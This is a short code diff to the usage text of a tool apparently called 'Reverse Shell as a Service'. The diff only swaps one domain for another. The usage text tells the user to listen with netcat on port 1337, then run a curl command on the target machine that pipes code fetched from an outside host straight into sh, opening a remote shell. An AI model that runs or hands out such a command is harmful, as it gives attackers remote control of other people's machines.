@@ -7,7 +7,7 @@ const usage = `# Reverse Shell as a Service
 #      nc -l 1337
 #
 # 2. On the target machine:
-#      curl https://shell.vercel.com/api/yourip:1337 | sh
+#      curl https://shell.vercel.app/api/yourip:1337 | sh
 #
 # 3. Don't be a dick`;
 
